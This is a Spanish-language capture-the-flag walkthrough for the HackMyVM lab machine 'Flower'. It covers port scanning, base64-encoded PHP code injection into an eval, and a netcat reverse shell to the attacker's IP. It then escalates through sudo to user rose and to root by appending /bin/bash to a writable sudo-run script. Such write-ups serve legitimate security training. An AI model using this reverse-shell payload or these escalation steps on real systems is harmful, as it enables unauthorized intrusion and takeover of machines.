---
layout: single
title: Flower - HackMyVM
excerpt: "Flower es máquina Linux creada por alienum. En esta máquina veremos como inyectar código php codificado en base64 para conseguir una reverse shell y conseguir acceso al sistema. Una vez en el sistema podremos saltar de usuario con un fichero en python y con una técnica llamada (python library hijacking). Conseguiremos el root usando un fichero oculto y sudo."
date: 2021-12-10
classes: wide
header:
  teaser: /assets/images/hmvm-Flower/hmvmFlower.png
  teaser_home_page: true
  icon: /assets/images/hmvm.png
categories:
  - hackmyvm
  - linux
  - Fácil
tags:
  - hackmyvm
  - rce
  - code injection
  - python library hijacking
  - alienum
---

### Escaneo de puertos
```bash
nmap -p- -T5 --open -v -n -Pn 192.168.1.82 -oG puertos

PORT   STATE SERVICE
80/tcp open  http
```

### Escaneo de servicios
```bash
nmap -sCV -p 80 192.168.1.82 -oN servicios        

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
```

### WEB

![](/assets/images/hmvm-Flower/web.png)

Al mirar el código fuente veo unas cadenas en el campo `value` codificadas en base64.

![](/assets/images/hmvm-Flower/webcodeFont.png)

Decodifico un par de cadenas.

![](/assets/images/hmvm-Flower/b64decode.png)

Són los valores de cada pétalo codificados en base64.

![](/assets/images/hmvm-Flower/inspectweb.png)

Codifico el comando `system('id')` para comprobar si el método eval es vulnerable a la inyección de comandos.
```bash
echo "system('id')" | base64
c3lzdGVtKCdpZCcpCg==
```

![](/assets/images/hmvm-Flower/www-dataweb.png)

Ahora codifico una shell en base64 para conseguir acceso al sistema.
```bash
echo "system('nc -e /bin/sh 192.168.1.38 4444')" | base64
c3lzdGVtKCduYyAtZSAvYmluL3NoIDE5Mi4xNjguMS4zOCA0NDQ0JykK
```

Pongo un netcat a la escucha.
```bash
nc -lvpn 4444
```

Pego la cadena codificada en base64 en el value de Lily y le doy a submit para entablarme una shell.

![](/assets/images/hmvm-Flower/shellcoded.png)

### Tratamiento TTY
```bash
script /dev/null -c bash
[ctrl + Z]
stty raw -echo;fg
reset
xterm
export TERM=xterm
export SHELL=bash
```
Me desplazo al home de la usuaria rose y miro si puedo lanzar algún comando como sudo.
```bash
www-data@flower:/home/rose$ sudo -l
Matching Defaults entries for www-data on flower:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on flower:
    (rose) NOPASSWD: /usr/bin/python3 /home/rose/diary/diary.py
```
Abro el archivo `diary.py` para ver su contenido.
```python
import pickle

diary = {"November28":"i found a blue viola","December1":"i lost my blue viola"}
p = open('diary.pickle','wb')
pickle.dump(diary,p)
```

### python library hijacking

![](/assets/images/hmvm-Flower/roseUserPivoting.png)

Ahora como usuaria rose ya puedo leer el user.txt.
```bash
rose@flower:~$ cat user.txt 
HMV{*****_***_****}
```

### sudo -l 
```bash
rose@flower:~/diary$ sudo -l
Matching Defaults entries for rose on flower:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User rose may run the following commands on flower:
    (root) NOPASSWD: /bin/bash /home/rose/.plantbook
```

Compruebo los permisos de .plantbook.

![](/assets/images/hmvm-Flower/permisosplantbook.png)	

Lanzo plantbook.

![](/assets/images/hmvm-Flower/plantbook.png)

Como tengo permisos de escritura le añado la siguiente línea:
``` bash
echo "/bin/bash" >> /home/rose/.plantbook
```

Lanzo de nuevo plantbook.

![](/assets/images/hmvm-Flower/root.png)

Como root ya puedo leer el fichero root.txt.

```bash
root@flower:~# cat root.txt 
HMV{*****_***_****_******}
```
